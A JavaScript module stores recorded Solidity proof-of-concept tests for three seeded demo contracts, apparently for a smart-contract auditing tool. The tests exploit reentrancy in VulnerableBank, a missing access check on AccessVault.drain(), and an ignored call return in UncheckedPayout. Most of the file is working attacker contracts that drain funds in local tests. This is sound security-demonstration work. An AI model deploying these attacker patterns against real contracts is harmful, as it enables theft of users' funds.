'use strict';

// Recorded exploit traces for each seeded demo contract.
// Used verbatim in demo mode (no LLM key). All of them are forge-std free so
// `forge test` runs offline with no dependency install.

// Contract #1: reentrancy in VulnerableBank.withdraw().
const REENTRANCY_POC = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/VulnerableBank.sol";

/// @notice Exploit contract: deposits 1 ether, then re-enters withdraw()
///         from receive() until the bank is drained.
contract Attacker {
    VulnerableBank public immutable bank;

    constructor(address payable bankAddress) {
        bank = VulnerableBank(bankAddress);
    }

    function attack() external payable {
        require(msg.value == 1 ether, "seed 1 ether");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
}

contract ReentrancyPoC {
    VulnerableBank internal bank;
    uint256 internal constant SEED = 1 ether;

    function setUp() public {
        bank = new VulnerableBank();
        // Bank starts funded with 10 ether of other users' deposits.
        payable(address(bank)).transfer(10 ether);
    }

    function testReentrancyDrainsBank() public {
        Attacker attacker = new Attacker(payable(address(bank)));

        attacker.attack{value: SEED}();

        // Attacker deposited 1 ether and walked away with everything.
        assert(address(attacker).balance > SEED);
        assert(address(bank).balance == 0);
    }
}
`;

// Contract #2: missing access control on AccessVault.drain().
const ACCESS_CONTROL_POC = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/AccessVault.sol";

/// @notice Non-owner attacker: no privileges, no owner key, just a call to drain().
contract VaultAttacker {
    AccessVault public immutable vault;

    constructor(address payable vaultAddress) {
        vault = AccessVault(vaultAddress);
    }

    function attack() external {
        // No access control on drain(): this call succeeds from any address.
        vault.drain();
    }

    receive() external payable {}
}

contract AccessControlPoC {
    AccessVault internal vault;
    uint256 internal constant DEPOSITS = 10 ether;

    function setUp() public {
        vault = new AccessVault();
        // Vault holds 10 ether of other users' deposits (the test acts as depositor).
        vault.deposit{value: DEPOSITS}();
    }

    function testNonOwnerDrainsVault() public {
        VaultAttacker attacker = new VaultAttacker(payable(address(vault)));
        uint256 startBalance = address(attacker).balance;

        // A plain non-owner calls the privileged function and succeeds.
        attacker.attack();

        // The attacker ends with more than it started with (it started with 0).
        assert(address(attacker).balance > startBalance);
        // And the vault is completely empty.
        assert(address(vault).balance == 0);
    }
}
`;

// Contract #3: ignored low-level call return value in UncheckedPayout.pay().
const UNCHECKED_CALL_POC = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/UncheckedPayout.sol";

/// @notice Recipient that refuses every ETH transfer.
contract RevertingRecipient {
    receive() external payable {
        revert("recipient rejects ETH");
    }
}

contract UncheckedCallPoC {
    UncheckedPayout internal payout;
    uint256 internal constant AMOUNT = 1 ether;

    function setUp() public {
        payout = new UncheckedPayout();
        payout.deposit{value: AMOUNT}();
    }

    function testUncheckedCallLosesFunds() public {
        RevertingRecipient recipient = new RevertingRecipient();

        // pay() ignores the failed low-level call and records the payout as done.
        payout.pay(payable(address(recipient)));

        // Proof of silent failure: no ETH reached the recipient ...
        assert(address(recipient).balance == 0);
        // ... yet the payout is marked complete and the sender's balance is gone.
        assert(payout.paid(address(recipient)));
        assert(payout.balances(address(this)) == 0);
    }
}
`;

const RECORDED_POCS = {
  reentrancy: REENTRANCY_POC,
  'access-control': ACCESS_CONTROL_POC,
  'unchecked-call': UNCHECKED_CALL_POC,
};

module.exports = {
  RECORDED_POCS,
  // Backwards-compatible alias for the original single-contract export.
  RECORDED_POC: REENTRANCY_POC,
};
